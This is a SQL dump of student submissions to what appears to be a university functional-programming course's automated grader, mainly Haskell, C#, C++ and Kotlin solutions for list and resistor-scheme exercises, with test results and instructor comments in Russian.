(2477, 57, 'hasp', '2012-10-21 18:15:27', 0, 'import Data.List\r\n\r\ncanGet [] = [0]\r\ncanGet (x:[]) = [x]\r\ncanGet l@(x:xs) =\r\n	let sz = length l in\r\n	let ps = take (sz-1) (tail (zip (inits l) (tails l))) in \r\n	foldl (acc (hd, tl) -> \r\n		let left = canGet hd in let right = canGet tl in \r\n			concat (left:right:(foldl (acc lf -> (foldl (ac rg -> (rg + lf):(rg*lf / (rg+lf)):ac ) [] right):acc) [] left))) [] ps\r\n\r\ncanMakeScheme  [] _ = False			\r\ncanMakeScheme  l@(x:xs) r = case (find (==r) (canGet l)) of Just _ -> True ; Nothing -> False', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 6'),
(2478, 78, '397095', '2012-10-21 18:29:24', 2, 'pascal = [1]:(zipWith (extZipWith (+) 0) pascal (map (0:) pascal))\r\n\r\nextZipWith f def xs ys = extZipWithImpl f def xs ys []\r\nextZipWithImpl f def (x:xs) (y:ys) res = extZipWithImpl f def xs ys (f x y:res)\r\nextZipWithImpl f def (x:xs) [] res = extZipWithImpl f def xs [] (f x def:res)\r\nextZipWithImpl f def [] (y:ys) res = extZipWithImpl f def [] ys (f def y:res)\r\nextZipWithImpl f def [] [] res = res\r\n   --- Все-таки формально у вас не по условию - вы определяете свой zipWith\r\n   --- Попробуйте пожалуйста обойтись стандартным - вместе с ++ например.\r\n   --- Это будет немного менее эффективно, но зато по условию.', '<br/>Тесты успешно пройдены!'),
(2479, 57, '6774563', '2012-10-21 18:33:53', 1, '--module Main where\r\n\r\n\r\n\r\n-- Идея: разбиваем список сопротивлений на 2 всеми способами, повторяем рекурсивно, \r\n\r\n-- пробуем соединить последовательно или параллельно\r\n\r\n-- Нужно слишком много памяти (мб для 9 и прокатит, но для 15 - точно нет).\r\n\r\n-- Также явно получается много одинаковых схем. Далее попробую сократить перебор.\r\n\r\n\r\n\r\nimport qualified Data.Set as Set\r\n\r\n\r\n\r\ncanMakeScheme xs m = fst (genSchemes xs m)\r\n\r\n\r\n\r\ngenSchemes [] m = (False, Set.empty)\r\n\r\ngenSchemes [x] m = (x == m, Set.singleton x)\r\n\r\ngenSchemes xs m = (Set.member m result, result) where\r\n\r\n	result = foldr (Set.union) Set.empty (map ((ys,ys'') -> combineResists (genSchemes ys m) (genSchemes ys'' m)) (allPartitions xs))\r\n\r\n\r\n\r\n	combineResists rs rs'' | fst rs || fst rs'' = Set.singleton m\r\n\r\n			      | otherwise         = (Set.fold (\r\n set -> Set.fold (\r\n'' s -> (s `Set.union` (Set.singleton (r*r''/(r+r''))) ) `Set.union` (Set.singleton (r+r''))) set (snd rs'')) Set.empty (snd rs))\r\n\r\n\r\n\r\nallPartitions xs = [p | n <- [1..(length(xs) `div` 2)], p <- partitions n xs]\r\n\r\n\r\n\r\n-- Список из всевозможных рабзиений xs на 2 списка, где длина одного из них - n. Порядок не важен\r\n\r\npartitions 0 xs = [ ([], xs) ]\r\n\r\npartitions n xs = [ (y:ys, zs++zs'') | (y:xs'',zs) <- seqParts xs, (ys,zs'') <- partitions (n-1) xs'']\r\n\r\n\r\n\r\nseqParts xs = seqPartsImpl (xs, [])\r\n\r\n\r\n\r\nseqPartsImpl ([],ys) = [([],ys)]\r\n\r\nseqPartsImpl (x:xs,ys) = (x:xs,ys):(seqPartsImpl (xs, x:ys))\r\n\r\n\r\n\r\n--main = putStrLn $ show(canMakeScheme [1,2,3] 1000)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2480, 58, '6774563', '2012-10-21 18:34:30', 2, '--- Что-то у меня для 9 не работает..\r\n---  Вот на таком примере: canMakeScheme [100000, 130, 2820, 20, 3000, 180, 30, 70, 3000] 101041\r\n--- Должно быть True (если например убрать 100000 из ресисторов и и из результата то у вас и выдает True\r\n--- Но для этого примера у меня GHC выдает out of memory. А у вас?\r\n--- Если хотите, можете попробовать оптимизировать, скажем до среды включительно\r\n\r\n--module Main where\r\n\r\n\r\n\r\n-- Идея: разбиваем список сопротивлений на 2 всеми способами, повторяем рекурсивно, \r\n\r\n-- пробуем соединить последовательно или параллельно\r\n\r\n-- Нужно слишком много памяти (мб для 9 и прокатит, но для 15 - точно нет).\r\n\r\n-- Также явно получается много одинаковых схем. Далее попробую сократить перебор.\r\n\r\n\r\n\r\nimport qualified Data.Set as Set\r\n\r\n\r\n\r\ncanMakeScheme xs m = fst (genSchemes xs m)\r\n\r\n\r\n\r\ngenSchemes [] m = (False, Set.empty)\r\n\r\ngenSchemes [x] m = (x == m, Set.singleton x)\r\n\r\ngenSchemes xs m = (Set.member m result, result) where\r\n\r\n	result = foldr (Set.union) Set.empty (map ((ys,ys'') -> combineResists (genSchemes ys m) (genSchemes ys'' m)) (allPartitions xs))\r\n\r\n\r\n\r\n	combineResists rs rs'' | fst rs || fst rs'' = Set.singleton m\r\n\r\n			      | otherwise         = (Set.fold (\r\n set -> Set.fold (\r\n'' s -> (s `Set.union` (Set.singleton (r*r''/(r+r''))) ) `Set.union` (Set.singleton (r+r''))) set (snd rs'')) Set.empty (snd rs))\r\n\r\n\r\n\r\nallPartitions xs = [p | n <- [1..(length(xs) `div` 2)], p <- partitions n xs]\r\n\r\n\r\n\r\n-- Список из всевозможных рабзиений xs на 2 списка, где длина одного из них - n. Порядок не важен\r\n\r\npartitions 0 xs = [ ([], xs) ]\r\n\r\npartitions n xs = [ (y:ys, zs++zs'') | (y:xs'',zs) <- seqParts xs, (ys,zs'') <- partitions (n-1) xs'']\r\n\r\n\r\n\r\nseqParts xs = seqPartsImpl (xs, [])\r\n\r\n\r\n\r\nseqPartsImpl ([],ys) = [([],ys)]\r\n\r\nseqPartsImpl (x:xs,ys) = (x:xs,ys):(seqPartsImpl (xs, x:ys))\r\n\r\n\r\n\r\n--main = putStrLn $ show(canMakeScheme [1,2,3] 1000)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2481, 57, 'hasp', '2012-10-21 18:54:58', 0, 'import Data.List\r\n\r\ncanGet [] = [0]\r\ncanGet (x:[]) = [x]\r\ncanGet l@(x:xs) =\r\n	let sbq = subsequences l in\r\n	let sz = length sbq in\r\n	let revs = reverse sbq in\r\n	let ps = take (sz-2) (tail (zip sbq revs)) in \r\n	foldl (acc (hd, tl) -> \r\n		let left = canGet hd in let right = canGet tl in \r\n			acc ++ (concat (left:right:(foldl (acc lf -> (foldl (ac rg -> (rg + lf):(rg*lf / (rg+lf)):ac ) [] right):acc) [] left)))) [] ps\r\n			\r\n--библиотечная функция, которую почему-то WinHugs не видит у меня \r\nsubsequences            :: [a] -> [[a]]\r\nsubsequences xs         =  [] : nonEmptySubsequences xs\r\n\r\nnonEmptySubsequences         :: [a] -> [[a]]\r\nnonEmptySubsequences []      =  []\r\nnonEmptySubsequences (x:xs)  =  [x] : foldr f [] (nonEmptySubsequences xs)\r\n  where f ys r = ys : (x : ys) : r			\r\n\r\ncanMakeScheme  [] _ = False			\r\ncanMakeScheme  l@(x:xs) r = case (find (==r) (canGet l)) of Just _ -> True ; Nothing -> False\r\n', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2482, 57, 'hasp', '2012-10-21 18:56:39', 0, 'import Data.List\r\n\r\ncanGet [] = [0]\r\ncanGet (x:[]) = [x]\r\ncanGet l@(x:xs) =\r\n	let sbq = subsequences l in\r\n	let sz = length sbq in\r\n	let revs = reverse sbq in\r\n	let ps = take (sz-2) (tail (zip sbq revs)) in \r\n	foldl (acc (hd, tl) -> \r\n		let left = canGet hd in let right = canGet tl in \r\n			acc ++ (concat (left:right:(foldl (acc lf -> (foldl (ac rg -> (rg + lf):(rg*lf / (rg+lf)):ac ) [] right):acc) [] left)))) [] ps\r\n			\r\n--библиотечная функция, которую почему-то WinHugs не видит у меня \r\nsubsequences            :: [a] -> [[a]]\r\nsubsequences xs         =  [] : nonEmptySubsequences xs\r\n\r\nnonEmptySubsequences         :: [a] -> [[a]]\r\nnonEmptySubsequences []      =  []\r\nnonEmptySubsequences (x:xs)  =  [x] : foldr f [] (nonEmptySubsequences xs)\r\n  where f ys r = ys : (x : ys) : r			\r\n\r\ncanMakeScheme  [] _ = False			\r\ncanMakeScheme  l@(x:xs) r = case (find (==r) (canGet l)) of Just _ -> True ; Nothing -> False\r\n', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2483, 57, 'hasp', '2012-10-21 19:00:56', 0, 'import Data.List\r\n\r\ncanGet [] = [0]\r\ncanGet (x:[]) = [x]\r\ncanGet l@(x:xs) =\r\n	let sbq = subsequences l in\r\n	let sz = length sbq in\r\n	let revs = reverse sbq in\r\n	let ps = take (sz-2) (tail (zip sbq revs)) in \r\n	foldl (acc (hd, tl) -> \r\n		let left = canGet hd in let right = canGet tl in \r\n			acc ++ (concat (left:right:(foldl (acc lf -> (foldl (ac rg -> (rg + lf):(rg*lf / (rg+lf)):ac ) [] right):acc) [] left)))) [] ps\r\n			\r\n--библиотечная функция, которую почему-то WinHugs не видит у меня \r\nsubsequences xs         =  [] : nonEmptySubsequences xs\r\n\r\nnonEmptySubsequences []      =  []\r\nnonEmptySubsequences (x:xs)  =  [x] : foldr f [] (nonEmptySubsequences xs)\r\n  where f ys r = ys : (x : ys) : r			\r\n\r\ncanMakeScheme  [] _ = False			\r\ncanMakeScheme  l@(x:xs) r = case (find (==r) (canGet l)) of Just _ -> True ; Nothing -> False\r\n', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2484, 57, 'hasp', '2012-10-21 19:04:39', 1, 'import Data.List\r\n\r\ncanGet [] = [0]\r\ncanGet (x:[]) = [x]\r\ncanGet l@(x:xs) =\r\n	let sbq = subsequencesI l in\r\n	let sz = length sbq in\r\n	let revs = reverse sbq in\r\n	let ps = take (sz-2) (tail (zip sbq revs)) in \r\n	foldl (acc (hd, tl) -> \r\n		let left = canGet hd in let right = canGet tl in \r\n			acc ++ (concat (left:right:(foldl (acc lf -> (foldl (ac rg -> (rg + lf):(rg*lf / (rg+lf)):ac ) [] right):acc) [] left)))) [] ps\r\n			\r\n--библиотечная функция, которую почему-то WinHugs не видит у меня \r\nsubsequencesI xs         =  [] : nonEmptySubsequences xs\r\n\r\nnonEmptySubsequences []      =  []\r\nnonEmptySubsequences (x:xs)  =  [x] : foldr f [] (nonEmptySubsequences xs)\r\n  where f ys r = ys : (x : ys) : r			\r\n\r\ncanMakeScheme  [] _ = False			\r\ncanMakeScheme  l@(x:xs) r = case (find (==r) (canGet l)) of Just _ -> True ; Nothing -> False\r\n', '<br/>Тесты успешно пройдены!'),
(2485, 65, 'erwert', '2012-10-21 19:09:56', 0, 'can = [ (a, b) | i <- [1..], j <- [1..2*i-1], let a = if i >= j then i else j - i; b = if i >= j then j else i]', 'Не удалось вычислить выражение "length(filter(==(3,2))(take 100 cantor))", проверьте правильность синтаксиса'),
(2486, 65, 'erwert', '2012-10-21 19:10:34', 1, 'cantor = [ (a, b) | i <- [1..], j <- [1..2*i-1], let a = if i >= j then i else j - i; b = if i >= j then j else i]', '<br/>Тесты успешно пройдены!'),
(2487, 78, '533223', '2012-10-21 19:12:19', 1, 'pascal = [1]:(zipWith (x y -> zipWith (+) (0:x) (y++[0])) (pascal) (pascal) )', '<br/>Тесты успешно пройдены!'),
(2488, 56, '442421', '2012-10-21 19:15:01', 0, 'allLists n k = allLists'' [x | x<-(sublists [1..n^2]), length x == k ] n\r\n\r\nallLists'' xs n = removeDoubled (map (x->(map (1+) x)) (map (x->(map (y->mod y n) x)) (filter (x-> head x <= n) xs)))\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs] ++ sublists xs\r\n\r\nremoveDoubled x = removeDoubled'' x []\r\n\r\nremoveDoubled'' [] r = r\r\nremoveDoubled'' (x:xs) r = if notexists x xs then removeDoubled'' xs ([x]++r) else  removeDoubled'' xs r\r\n\r\nnotexists x [] = True\r\nnotexists a (x:xs) = if a==x\r\n			then False\r\n			else notexists a xs', 'Выражение имеет неправильное значение: length (allLists 2 5)'),
(2489, 57, '3742311', '2012-10-21 19:16:41', 0, 'subSchemes [] _ = []\r\nsubSchemes (h:t) r = ((h + r):t):((h * r /(h + r)):t):(map (x -> r:x) (subSchemes t r))\r\n\r\ncanMakeScheme [e] r = s == r\r\ncanMakeScheme (h:t) r = any (x -> canMakeScheme x) (subSchemes t h)', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2490, 57, '3742311', '2012-10-21 19:18:05', 0, 'subSchemes [] _ = []\r\nsubSchemes (h:t) r = ((h + r):t):((h * r /(h + r)):t):(map (x -> r:x) (subSchemes t r))\r\n\r\ncanMakeScheme [e] r = s == r\r\ncanMakeScheme (h:t) r = any (x -> canMakeScheme x r) (subSchemes t h)', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2491, 57, '3742311', '2012-10-21 19:19:10', 0, 'subSchemes [] _ = []\r\nsubSchemes (h:t) r = ((h + r):t):((h * r /(h + r)):t):(map (x -> r:x) (subSchemes t r))\r\n\r\ncanMakeScheme [e] r = e == r\r\ncanMakeScheme (h:t) r = any (x -> canMakeScheme x r) (subSchemes t h)', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 6'),
(2492, 56, '533223', '2012-10-21 19:19:50', 1, 'allLists n 0 = [[]]\r\nallLists n k = [ x:y| x<-[1..n], y<-(allLists n (k-1))]', '<br/>Тесты успешно пройдены!'),
(2493, 56, '442421', '2012-10-21 19:21:26', 2, '  --- Я не знаю, как вам это удалось), но при вызова allLists 3 3 ваша программа видимо циклится, ничего не выдает\r\n  --- и не завершается. Если хотите, можете исправить, скажем до вторника включительно.\r\nallLists n k = allLists'' [x | x<-(sublists [1..n^k]), length x == k ] n\r\n\r\nallLists'' xs n = removeDoubled (map (x->(map (1+) x)) (map (x->(map (y->mod y n) x)) (filter (x-> head x <= n) xs)))\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs] ++ sublists xs\r\n\r\nremoveDoubled x = removeDoubled'' x []\r\n\r\nremoveDoubled'' [] r = r\r\nremoveDoubled'' (x:xs) r = if notexists x xs then removeDoubled'' xs ([x]++r) else  removeDoubled'' xs r\r\n\r\nnotexists x [] = True\r\nnotexists a (x:xs) = if a==x\r\n			then False\r\n			else notexists a xs', 'Не удалось вычислить выражение "length (allLists 3 3)", проверьте правильность синтаксиса'),
(2494, 57, '3742311', '2012-10-21 19:22:24', 0, 'subSchemes [] _ = []\r\nsubSchemes (h:t) r = ((h + r):t):((h * r /(h + r)):t):(map (x -> r:x) (subSchemes t r))\r\n\r\ncanMakeScheme [e] r = e == r\r\ncanMakeScheme (h:t) r = any (x -> x == r) (h:t) || any (x -> canMakeScheme x r) (subSchemes t h)', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 6'),
(2495, 57, '3742311', '2012-10-21 19:52:02', 0, 'subSchemes [] _ = [[]]\r\nsubSchemes (h:t) r = ((h + r):t):((h * r /(h + r)):t):(map (x -> h:x) (subSchemes t r))\r\n\r\ncanMakeScheme [e] r = e == r\r\ncanMakeScheme (h:t) r = h == r || any (x -> canMakeScheme x r) (subSchemes t h)', 'Выражение имеет неправильное значение: canMakeScheme [50,13,2,3,7] 56'),
(2496, 56, '5477377', '2012-10-21 20:08:10', 0, '', 'Не удалось вычислить выражение "allLists 1 1", проверьте правильность синтаксиса'),
(2497, 56, '5477377', '2012-10-21 20:09:09', 1, '{-Надеюсь, что 8 минут это не страшно-}\r\n   --- ОК, не страшно)\r\ndblList n= [[x]| x <- [1..n]]\r\nlist n = [x | x <- [1..n]] \r\n\r\nlengUp [] b = []\r\nlengUp (ha:a) b = (map (y -> ha:y) b)++( lengUp a b)\r\n\r\nallLists n 1 = dblList n\r\nallLists n k = lengUp (list n) (allLists n (k-1))', '<br/>Тесты успешно пройдены!'),
(2498, 59, '442421', '2012-10-21 20:12:34', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _13._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static int[] nonZeroLastDigits(IEnumerable<int> param)\r\n\r\n        {\r\n\r\n            return param.Select(x => Math.Abs(x % 10)).Where(x => x != 0).ToArray(); \r\n\r\n        }\r\n\r\n\r\n\r\n        static void print(int[] a)\r\n\r\n        {\r\n\r\n            foreach (int i in a)\r\n\r\n            {\r\n\r\n                Console.Write(i + " ");\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            print(nonZeroLastDigits(new int[5]{1,2,15,13,18}));\r\n\r\n            print(nonZeroLastDigits(new int[5] { 1, 20, 15, 13, 18 }));\r\n\r\n            print(nonZeroLastDigits(new int[5] { 1, 2, 150, 13, 18 }));\r\n\r\n            print(nonZeroLastDigits(new int[5] { 1, 2, 15, -132, 18 }));\r\n\r\n            print(nonZeroLastDigits(new int[5] { 10, 20, 15, 13, 18 }));\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2499, 59, '51559263', '2012-10-21 20:26:41', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace nonZeroastDigits\r\n{\r\n    class Program\r\n    {\r\n        static int[] nonZeroLastDigits(int[] arr)\r\n        {\r\n            return arr.Select( x => x % 10 ).ToArray().Where( x => x != 0 ).ToArray();\r\n        }\r\n\r\n        static void Main()\r\n        {\r\n            int[] a = { 354, 20, 9, 31 };\r\n            int[] b = nonZeroLastDigits(a);\r\n\r\n            foreach (int n in b) \r\n                Console.Write( n + " " );\r\n\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2500, 70, '472848', '2012-10-21 20:28:30', 1, 'myFilter pred li = foldr (x l -> if (pred x) then (x:l) else l) [] li ', '<br/>Тесты успешно пройдены!'),
(2501, 57, '3742311', '2012-10-21 20:42:34', 2, '  --- Ну да, тут что-то не то, даже не компилируется..\r\nsubSchemes [a] b = a:(a + b):(a * b / (a + b))\r\nsubSchemes (h:t) r = ((h + r):t):((h * r /(h + r)):t):(map (x -> h:x) (subSchemes t r)):(map (x -> subSchemes x r) subSchemes (tail t) (head t))\r\n\r\ncanMakeScheme [e] r = e == r\r\ncanMakeScheme (h:t) r = h == r || any (x -> canMakeScheme x r) (subSchemes t h)', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2502, 60, '442421', '2012-10-21 21:06:12', 1, '#include "stdafx.h"\r\n#include <conio.h>\r\n#include <iostream>\r\n#include <algorithm>    \r\n\r\nusing namespace std;\r\n\r\nvoid nonZeroLastDigits(int param[], int length)\r\n{\r\n	int* pbegin = param;  \r\n	int* pend = param+length;\r\n\r\n	pend = remove_if (pbegin, pend, [] (int i) { return i % 10 ==0; });\r\n\r\n	int l = pend - pbegin ;\r\n	int * retVal = new int (l);\r\n	transform(pbegin, pend, retVal, [] (int i) { return abs(i % 10); });\r\n\r\n	for (int* p=retVal; p!=retVal+l; ++p)\r\n	  cout << " " << *p;\r\n\r\n	cout << endl;\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	int a [] = {123,-212,30,-40,5};\r\n\r\n	nonZeroLastDigits(a,5);\r\n\r\n	_getch();\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(2503, 78, 'hasp', '2012-10-21 21:12:58', 1, 'pascal = [1] : (map (	 -> foldr ((a1, a2) acc -> (a1+a2):acc) [1] (zip t (0:t)) ) pascal)\r\n   --- Или тут можно применить zipWith', '<br/>Тесты успешно пройдены!'),
(2504, 59, 'erwert', '2012-10-21 21:30:22', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace linq {\r\n class Pg {\r\n	public static int [] nonZeroLastDigits(int[] a){\r\n		return a.Select(x => x % 10).ToArray().Where(x => x > 0).ToArray();\r\n	}\r\n	\r\n	static void Main() {\r\n		int[] a = {354, 20, 9, 31};\r\n		foreach(int val in nonZeroLastDigits(a))\r\n			Console.WriteLine(val);\r\n	}\r\n }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2505, 60, 'erwert', '2012-10-21 21:30:37', 1, '#include <algorithm>\r\n#include <stdio.h>\r\nusing namespace std;\r\n\r\nvoid nonZeroLastDigits(int a[], int n){\r\n  --- Или немного лучше const int a[]\r\n	int b[n];\r\n	transform(a, a + n, b, [] (int i) { return i % 10; });\r\n	int *c = remove_if(b, b + n, [] (int i) { return i <= 0; });\r\n	while(*c)\r\n		printf("%d", *c++);\r\n}\r\n\r\nint main(){\r\n	int a[] = {14,30,5,13};\r\n	int n = 4;\r\n	nonZeroLastDigits(a, n);\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(2506, 68, '442421', '2012-10-21 21:31:01', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _16._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static int[] zeroDigits(IEnumerable<int> a, int n)\r\n\r\n        {\r\n\r\n            return a.Select(x => (int) (x / Math.Pow(10, n)) * (int) Math.Pow(10,n)).ToArray();\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = new int[3] { 563, 5643, 76796 };\r\n\r\n\r\n\r\n            foreach (int i in zeroDigits(a, 2))\r\n\r\n            {\r\n\r\n                Console.Write(i + " ");\r\n\r\n            }\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2507, 60, '51559263', '2012-10-21 21:38:33', 1, '#include <stdio.h>\r\n#include <algorithm>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nvoid nonZeroLastDigits( int* pA, int size )\r\n{\r\n	int* pB = new int[size];\r\n	transform( pA, pA + size, pB, [](int n){ return n %= 10; } );\r\n\r\n	int* pEnd = remove_if( pB, pB + size, [](int n){ return n == 0; } );\r\n\r\n	while ( pB != pEnd )\r\n		cout << *(pB++) << " " ;\r\n}\r\n\r\nvoid main()\r\n{\r\n	int a[] = { 101, -200, 345, 45530, -5 };\r\n\r\n	nonZeroLastDigits( a, 5 );\r\n\r\n	char c;\r\n	cin >> c;\r\n}', '<br/>Тесты успешно пройдены!'),
(2508, 78, '397095', '2012-10-21 21:52:00', 1, 'pascal = [1]:(zipWith (zipWith (+)) (map (++[0]) pascal) (map (0:) pascal))', '<br/>Тесты успешно пройдены!'),
(2509, 78, '2562137', '2012-10-21 22:41:57', 1, 'pascal = [1]:[zipWith (+) (0:x) (x++[0]) | x <- pascal]', '<br/>Тесты успешно пройдены!'),
(2510, 67, '442421', '2012-10-21 22:42:20', 1, '// 16.2.cpp: определяет точку входа для консольного приложения.\r\n//\r\n\r\n#include "stdafx.h"\r\n#include <conio.h>\r\n#include <iostream>\r\n#include <algorithm>    \r\n\r\nusing namespace std;\r\n\r\nint * zeroDigits(int * a, int size, int n)\r\n{\r\n	int* pbegin = a;  \r\n	int* pend = a+size;\r\n\r\n	int * retVal = new int (size);\r\n	transform(pbegin, pend, retVal, [n] (int i) { return i / ((int) pow(10.0,n)) * ((int) pow(10.0,n)); });\r\n   --- OK, но лучше, конечно, считать pow один раз, а не два (а еще лучше, сосчитать pow один раз вне цикла)\r\n	return retVal;\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n\r\n	int a [] = {563, 5643, 76796};\r\n\r\n	int* t = zeroDigits(a,3,2);\r\n\r\n	for (int i = 0 ; i < 3; ++i)\r\n	{\r\n		cout<<t[i]<<" ";\r\n	}\r\n\r\n	_getch();\r\n	return 0;\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2511, 65, '442421', '2012-10-21 22:49:50', 2, '  --- Нет, это мы обсуждали и на прозапрошлом занятии и на прошлом: list comprehension\r\n  --- может корректно работать только с одним бесконечным списком, но не с двумя..\r\ncantor = [(i,j)| i<-[1,2..], j<-[1,2..]]', 'Выражение имеет неправильное значение: length(filter(==(3,2))(take 100 cantor))'),
(2512, 68, '51559263', '2012-10-22 00:17:59', 2, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace zeroDigits\r\n{\r\n    class Program\r\n    {\r\n        static string nZeros( int a, int n )\r\n        {\r\n            if (a >= 0 && a.ToString().Length <= n)\r\n            {\r\n                return new string(a.ToString().Select(x => ''0'').ToArray());\r\n            }\r\n            else if (a.ToString().Length <= n + 1)\r\n            {\r\n                return "-" + new string(a.ToString().Substring(1).Select(x => ''0'').ToArray());\r\n            }\r\n\r\n            for (int i = 1; i <= n; i++)\r\n                a -= (a % ((int)Math.Pow(10, i)));\r\n              --- В принципе это работает, но, мне кажется, очень не эффективно \r\n              ---  - зачем вы тут написали цикл. Вроде одно вычитания будет достаточно.\r\n              ---  - зачем два if в начале. Мне кажется, этого кода достаточно, сосчитал pow, отнял остаток и все\r\n              ---  - лучше, в принципе, сосчитать pow один раз для всего массива - он ведь всегда один и тот же\r\n              --- Попробуйте это исправить, пожалуйста.\r\n\r\n            return a.ToString();\r\n        }\r\n\r\n        static string[] zeroDigits( int[] a, int n )\r\n        {\r\n            return a.Select( x => nZeros(x, n) ).ToArray();\r\n        }\r\n\r\n        static void Main( )\r\n        {\r\n            int[] arr = { -134, 2, -3222, 4341332, 53, 6876 };\r\n\r\n            foreach ( string str in zeroDigits(arr, 5) )\r\n                Console.Write(str + " ");\r\n\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2513, 59, 'hasp', '2012-10-22 08:04:52', 1, '/*задача была отправлена на почту*/\r\nimport java.util.ArrayList\r\nimport java.util.Arrays\r\n\r\nfun <E, T> ArrayList<E>.myMap(mapper: (E) -> T): ArrayList<T> {\r\n    val myList = ArrayList<T>(this.size())\r\n    for (e in this) myList.add(mapper(e))\r\n    return myList\r\n}\r\n\r\nfun <E> ArrayList<E>.filter(p: (E) -> Boolean): ArrayList<E> {\r\n    val myList = ArrayList<E>(this.size())\r\n    for (e in this) if (p(e)) myList.add(e)\r\n    myList.trimToSize()\r\n    return myList\r\n}\r\n\r\nfun main(args: Array<String>) {\r\n    val list = ArrayList<Int>(Arrays.asList(354, 20, 9, 31, -12))\r\n\r\n    println(list filter {i -> i%10 != 0} myMap {i -> i%10})\r\n}', '<br/>Тесты успешно пройдены!'),
(2514, 60, 'hasp', '2012-10-22 08:06:57', 1, '/*Задача была отправлена на почту*/\r\nimport java.util.ArrayList;\r\nimport java.util.Arrays;\r\nimport java.util.Collection;\r\n\r\npublic class Task_13_2 {\r\n    static class MyList<E> extends ArrayList<E> {\r\n        MyList() {}\r\n\r\n        MyList(int ic) {\r\n            super(ic);\r\n        }\r\n\r\n        MyList(Collection<? extends E> c) {\r\n            super(c);\r\n        }\r\n\r\n        abstract class Mapper<T> {\r\n            abstract T apply(E e);\r\n        }\r\n\r\n        abstract class Predicate {\r\n            abstract boolean satisfy(E e);\r\n        }\r\n\r\n        <T> MyList<T> transform(Mapper<T> map) {\r\n            MyList<T> myList = new MyList<T>(size());\r\n            for (E e : this) myList.add(map.apply(e));\r\n            return myList;\r\n        }\r\n\r\n        MyList<E> filter(Predicate p) {\r\n            MyList<E> myList = new MyList<E>(size());\r\n            for (E e : this) if (p.satisfy(e)) myList.add(e);\r\n            myList.trimToSize();\r\n            return myList;\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2515, 59, '3607492', '2012-10-22 09:04:22', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        static void nonZeroLastDigits(int[] arr)\r\n        {\r\n            int[] c = arr.Select(x => x % 10).Where(x => x%10 != 0).ToArray();\r\n            foreach (int item in c)\r\n                Console.Write("{0} ",item);\r\n            Console.ReadKey();\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = { 123, 124, 126, 128 ,120,111};\r\n\r\n            Program.nonZeroLastDigits(a);\r\n\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
